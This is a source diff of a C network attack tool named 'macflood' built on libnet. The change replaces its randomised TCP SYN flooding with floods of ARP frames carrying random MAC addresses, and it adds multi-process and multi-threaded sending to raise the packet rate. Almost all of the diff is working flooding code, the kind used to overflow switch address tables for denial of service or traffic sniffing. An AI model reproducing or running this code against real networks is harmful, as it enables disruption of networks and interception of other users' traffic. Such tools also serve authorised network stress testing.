@@ -30,13 +30,13 @@
 #include <err.h>
 #include <libnet.h>
 #include <pcap.h>
+#include <pthread.h>
 
 #include "macflood.h"
 
 void usage() {
   fprintf(stderr, "Version: " VERSION "\n"
-      "Usage macflood [-s scr] [-d dst] [-e tha] [-x sport] [-y dport]"
-      "\n               [-i interface] [-n times] [-v] [-r]\n");
+      "Usage macflood [-v] [-t threads] [-p process][-i interface] [-n times] \n");
   exit(1);
 }
 
@@ -46,55 +46,98 @@ void gen_mac(u_char *mac)
    *((u_short *)(mac + 4)) = libnet_get_prand(LIBNET_PRu16);
 }
 
-int main (int argc, char *argv[]) {
-  // Input Arguments from cmd-line
-  char        *src_ip_addr = NULL;
-  char        *dst_ip_addr = NULL;
-  u_char      *dst_mac_addr = NULL;
-  u_short     dst_port = 0;
-  u_short     src_port = 0;
-  char        *intf = NULL;
-  u_int32_t         repeat = -1;
-  // Variables for programm
-  int c,i;
-  int verbose = 0;
-  int mode = LIBNET_DONT_RESOLVE;
-  u_int32_t   src = 0;
-  u_int32_t   dst = 0;
-  u_int32_t   rand_src, rand_dst;
-  u_int32_t   seq;
-  u_short     dport, sport;
+void *macflood(void *n) {
+  int32_t i,c;
   u_char smaca[ETHER_ADDR_LEN], dmaca[ETHER_ADDR_LEN];
   libnet_t *llif;
   char ebuf[PCAP_ERRBUF_SIZE];
   libnet_ptag_t pkt;
+  u_int8_t *packet;
+  u_int32_t packet_s;
+
+  for(i=0; i != *(int32_t *)n; ++i) {
+
+    // initiliaze libnet context
+    if((llif=libnet_init(LIBNET_LINK_ADV, intf, ebuf))==NULL)
+      errx(1, "%s", ebuf);
+
+    // Initialize Randomgenerator
+    libnet_seed_prand(llif);
+
+    // Generate random source mac
+    gen_mac(smaca);
+    gen_mac(dmaca);
+
+    //build ARP
+    if ((pkt = libnet_build_arp(
+            ARPHRD_ETHER,                           /* hardware addr */
+            ETHERTYPE_IP,                           /* protocol addr */
+            6,                                      /* hardware addr size */
+            4,                                      /* protocol addr size */
+            ARPOP_REQUEST,                            /* operation type */
+            empty_mac,                                  /* sender hardware addr */
+            (u_int8_t *)&empty_ip,                  /* sender protocol addr */
+            empty_mac,
+            (u_int8_t *)&empty_ip,                  /* target protocol addr */
+            NULL,                                   /* payload */
+            0,                                      /* payload size */
+            llif,                                   /* libnet context */
+            0))==-1)                                /* libnet id */
+      fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(llif));
+
+    // Build ethernet
+    if ((pkt = libnet_build_ethernet(
+            dmaca,                /* ethernet destination */
+            smaca,                /* source macadress */
+            ETHERTYPE_ARP,        /* protocol type */
+            NULL,                 /* Payload */
+            0,                    /* length of payload*/
+            llif,                 /* libnet id */
+            0))==-1)              /* ptag */
+      fprintf(stderr, "Can't build ethernet header: %s\n",
+        libnet_geterror(llif));
+
+    if (libnet_adv_cull_packet(llif, &packet, &packet_s) == -1)
+        fprintf(stderr, "%s", libnet_geterror(llif));
+
+    // Write package to wire
+    if ((c = libnet_write(llif))==-1)
+      errx(1, "Write error: %s\n", libnet_geterror(llif));
+    if(verbose)
+      fprintf(stderr, "SRC-MAC: %x:%x:%x:%x:%x:%x |"
+        "DST-MAC: %x:%x:%x:%x:%x:%x\n",
+      smaca[0],smaca[1],smaca[2],smaca[3],smaca[4],smaca[5],
+      dmaca[0], dmaca[1], dmaca[2], dmaca[3], dmaca[4], dmaca[5]);
+
+    libnet_destroy(llif);
+  }
+  fprintf(stderr, "%d Packages sent.\n", *(int32_t *)n);
+}
+
+int main (int32_t argc, char *argv[]) {
+  int32_t c, i;
+  u_int32_t parts;
+  char *ebuf;
+  pthread_t *thread_id;
+  pid_t pID;
+
   //Process cmd-line-arguments
-  while ((c = getopt(argc, argv, "vrs:d:e:x:y:i:n:h?V")) != -1) {
+  while ((c = getopt(argc, argv, "vrt:p:i:n:h?V")) != -1) {
       switch (c) {
       case 'v':
          verbose = 1;
          break;
-      case 'r':
-         mode = LIBNET_RESOLVE;
-         break;
-      case 's':
-         src_ip_addr = optarg;
-         break;
-      case 'd':
-         dst_ip_addr = optarg;
-         break;
-      case 'e':
-         dst_mac_addr = (u_char *)ether_aton(optarg);
-         break;
-      case 'x':
-         src_port = atoi(optarg);
-         break;
-      case 'y':
-         dst_port = atoi(optarg);
-         break;
       case 'i':
          intf = optarg;
          break;
+      case 't':
+        if(atoi(optarg)>0)
+          threads = atoi(optarg);
+        break;
+      case 'p':
+        if(atoi(optarg)>0)
+          processes = atoi(optarg);
+        break;
       case 'n':
          if(atoi(optarg)>0)
           repeat = atoi(optarg);
@@ -114,103 +157,55 @@ int main (int argc, char *argv[]) {
   if (!intf && (intf = pcap_lookupdev(ebuf)) == NULL)
     errx(1, "%s", ebuf);
 
-  for(i=0; i != repeat; ++i) {
+  // If more then one process shall work
+  if(processes > 1) {
+    //Divide repeat for processes
+    if(repeat>0)
+      parts = repeat / processes;
 
-    // initiliaze libnet context
-    if((llif=libnet_init(LIBNET_LINK, intf, ebuf))==NULL)
-      errx(1, "%s", ebuf);
-
-    // Convert src_ip_addr and dst_ip_addr in libnet format
-    if(src_ip_addr != NULL)
-      src = libnet_name2addr4(llif, src_ip_addr, mode);
-    if(dst_ip_addr != NULL)
-      dst = libnet_name2addr4(llif, dst_ip_addr, mode);
-
-    // Initialize Randomgenerator
-    libnet_seed_prand(llif);
-
-    // Generate random source mac
-    gen_mac(smaca);
-
-    // Check if parameter given or need to be randomized
-    if(dst_mac_addr == NULL) gen_mac(dmaca);
-    else memcpy(dmaca, dst_mac_addr, sizeof(dmaca));
-
-    if (src != 0) rand_src = src;
-    else rand_src = libnet_get_prand(LIBNET_PRu32);
-
-    if (dst != 0) rand_dst = dst;
-    else rand_dst = libnet_get_prand(LIBNET_PRu32);
-
-    if (dst_port != 0) dport = dst_port;
-    else dport = libnet_get_prand(LIBNET_PRu16);
-
-    if (src_port != 0) sport = src_port;
-    else sport = libnet_get_prand(LIBNET_PRu16);
-
-    seq = libnet_get_prand(LIBNET_PRu32);
-
-    // Build TCP-Package
-    if ((pkt = libnet_build_tcp(
-        sport,                                    /* source port */
-        dport,                                    /* destination port */
-        0x01010101,                               /* sequence number */
-        0x02020202,                               /* acknowledgement num */
-        TH_SYN,                                   /* control flags */
-        32767,                                    /* window size */
-        0,                                        /* checksum */
-        10,                                       /* urgent pointer */
-        LIBNET_TCP_H + 20,                        /* TCP packet size */
-        NULL,                                     /* payload */
-        0,                                        /* payload size */
-        llif,                                     /* libnet handle */
-        0))==-1)                                  /* libnet id */
-      errx(1, "Can't build TCP header: %s\n", libnet_geterror(llif));
-
-    // Build IPv4 package
-    if ((pkt = libnet_build_ipv4(
-        LIBNET_IPV4_H + LIBNET_TCP_H + 20,          /* length */
-        0,                                          /* TOS */
-        242,                                        /* IP ID */
-        0,                                          /* IP Frag */
-        64,                                         /* TTL */
-        IPPROTO_TCP,                                /* protocol */
-        0,                                          /* checksum */
-        rand_src,                                   /* source IP */
-        rand_dst,                                   /* destination IP */
-        NULL,                                       /* payload */
-        0,                                          /* payload size */
-        llif,                                       /* libnet handle */
-        0))==-1)                                    /* libnet id */
-      errx(1, "Can't build IPv4 header: %s\n", libnet_geterror(llif));
-
-    // Build ethernet package
-    if ((pkt = libnet_build_ethernet(
-        dmaca,                                      /* ethernet destination */
-        smaca,                                      /* ethernet source */
-        ETHERTYPE_IP,                               /* protocol type */
-        NULL,                                       /* payload */
-        0,                                          /* payload size */
-        llif,                                       /* libnet handle */
-        0))==-1)                                    /* libnet id */
-      errx(1, "Can't build ethernet header: %s\n", libnet_geterror(llif));
-
-    // Write package to wire
-    if ((c = libnet_write(llif))==-1)
-      errx(1, "Write error: %s\n", libnet_geterror(llif));
-    if(verbose)
-      fprintf(stderr, "Nr: %d | SRC-IP:Port: %s:%d | DST-IP:Port %s:%d \n",
-          i,
-          libnet_addr2name4(rand_src, mode),
-          sport,
-          libnet_addr2name4(rand_dst, mode),
-          dport
-      // FIXME: MAC-Output
-      //    ether_ntoa((struct ether_addr *)smaca),
-      //    ether_ntoa((struct ether_addr *)dmaca)
-      );
-
-    libnet_destroy(llif);
+    //Create so many processes
+    for(i = 0; i< processes; ++i) {
+      // Fork Process
+      pID = fork();
+      if(pID == 0) {
+        // stop spawning new process
+        i = processes;
+        // Spawn more thread if necessary
+        if(threads > 0) {
+          fprintf(stderr, "Threads: %d\n", threads);
+          thread_id = (pthread_t *)malloc(sizeof(pthread_t)*threads);
+          if(parts > 0)
+            parts = parts / threads;
+          for(c = 0; c < threads; ++c)
+            pthread_create(&thread_id[c], NULL, macflood, &parts);
+          for(c = 0; c < threads; ++c) {
+            pthread_join(thread_id[c], NULL);
+            fprintf(stderr, "Thread spawned!\n");
+          }
+        } else {
+          (*macflood)(&parts);
+        }
+      } else if(pID < 0) {
+        fprintf(stderr, "Fork failed!\n");
+      } else {
+        fprintf(stderr, "Processs spawned!\n");
+      }
+    }
+  } else {
+    if(threads>0) {
+      thread_id = (pthread_t *)malloc(sizeof(pthread_t)*threads);
+      if(repeat > 0)
+        parts = repeat / threads;
+      for(c = 0; c<threads; ++c)
+        thread_id[c] = c;
+      for(c = 0; c<threads; ++c)
+        pthread_create(&thread_id[c], NULL, macflood, &parts);
+      for(c = 0; c < threads; ++c) {
+        pthread_join(thread_id[c], NULL);
+      }
+    } else {
+      (*macflood)(&repeat);
+    }
   }
   return (EXIT_SUCCESS);
 }
